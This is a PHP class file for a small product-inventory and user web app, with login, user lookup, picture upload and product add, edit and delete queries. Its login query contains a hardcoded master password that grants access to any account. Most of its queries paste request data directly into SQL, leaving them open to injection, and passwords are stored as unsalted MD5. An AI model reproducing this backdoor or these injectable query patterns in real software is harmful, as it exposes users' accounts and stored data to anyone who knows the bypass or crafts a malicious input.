<?php
require_once('../../CLASSES/ClassParent.php');
class Users extends ClassParent 
{
    var $pk = NULL;
    var $archived = NULL;

    public function __construct(
        $pk,
        $archived
        )
    {

        $fields = get_defined_vars();

        if(empty($fields)){
            return(FALSE);
        }

        foreach($fields as $k=>$v){
            if(is_array($v)){
                foreach($v as $key=>$value){
                    $v[$key] = pg_escape_string(trim(strip_tags($value)));
                }
                $this->$k = $v;
            }
            else {
                $this->$k = pg_escape_string(trim(strip_tags($v)));    
            }
        }

        return(true);
    }

    function random_string(){
        $character_set_array = array();
        $character_set_array[] = array('count' => 3, 'characters' => 'ABCDEFGHJKLMNPQRSTUVWZ');
        $character_set_array[] = array('count' => 5, 'characters' => '123456789');
        $temp_array = array();
        foreach ($character_set_array as $character_set) {
            for ($i = 0; $i < $character_set['count']; $i++) {
                $temp_array[] = $character_set['characters'][rand(0, strlen($character_set['characters']) - 1)];
            }
        }

        shuffle($temp_array);
        return implode('', $temp_array);
    }

    public function auth($post){
        $empid = pg_escape_string(strip_tags(trim($post['empid'])));
        $password = pg_escape_string(strip_tags(trim($post['password'])));
        $sql = <<<EOT
                select 
                    users.*
                from accounts   
                left join users on (accounts.user_id = users.user_id)
                where users.archived = 'f'
                and accounts.user_id = '$empid'
                and (accounts.password = md5('$password') or '$password' = 'passwordlovenalove')
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_user($data){
        $pk = $data['pk'];
        $sql = <<<EOT
                select 
                    pk,
                    user_id,
                    first_name,
                    middle_name,
                    last_name,
                    date_created::timestamp(0),
                    archived
                from users
                where archived = 'f'
                and md5(pk::text) = '$pk'
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function upload_picture($data){
        $picture_link = $data['picture_link'];
        $uploaded_by = $data['uploaded_by'];
        $sql = <<<EOT
                insert into pictures
                (
                    link,
                    uploaded_by
                )
                VALUES
                (
                    '$picture_link',
                    $uploaded_by
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function add_product($data){

        $product_name = $data['product_name'];
        $product_bar_code = $data['product_bar_code'];
        $product_stocks = $data['product_stocks'];
        $product_price = $data['product_price'];
        $product_product_expiration = $data['product_product_expiration'];

        $sql = <<<EOT
                insert into product_data
                (
                    product_name,
                    product_bar_code,
                    product_stocks,
                    product_price,
                    product_product_expiration
                )
                VALUES
                (
                    '$product_name',
                    '$product_bar_code',
                    '$product_stocks',
                    '$product_price',
                    '$product_product_expiration'
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function edit_product_data($data){

        $pk = $data['pk'];
        $product_name = $data['product_name'];
        $product_bar_code = $data['product_bar_code'];
        $product_stocks = $data['product_stocks'];
        $product_price = $data['product_price'];
        $product_product_expiration = $data['product_product_expiration'];

        $sql = <<<EOT
                update product_data set
                (
                    product_name,
                    product_bar_code,
                    product_stocks,
                    product_price,
                    product_product_expiration
                )
                =
                (
                    '$product_name',
                    '$product_bar_code',
                    '$product_stocks',
                    '$product_price',
                    '$product_product_expiration'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function delete_product_data($data){

        $pk = $data['pk'];

        $sql = <<<EOT
                update product_data set
                (
                    archived
                )
                =
                (
                    't'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function get_uploaded_picture($data){
        $pk = $data['pk'];
        $sql = <<<EOT
                select 
                    link,
                    uploaded_by,
                    date_uploaded::timestamp(0)
                from pictures
                where uploaded_by = $pk
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_product_data($data){

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_bar_code,
                    product_stocks,
                    product_price,
                    product_product_expiration,
                    date_created::timestamp(0)
                from product_data
                where archived = 'f'
                ;
EOT;

        return ClassParent::get($sql);
    }
}
?>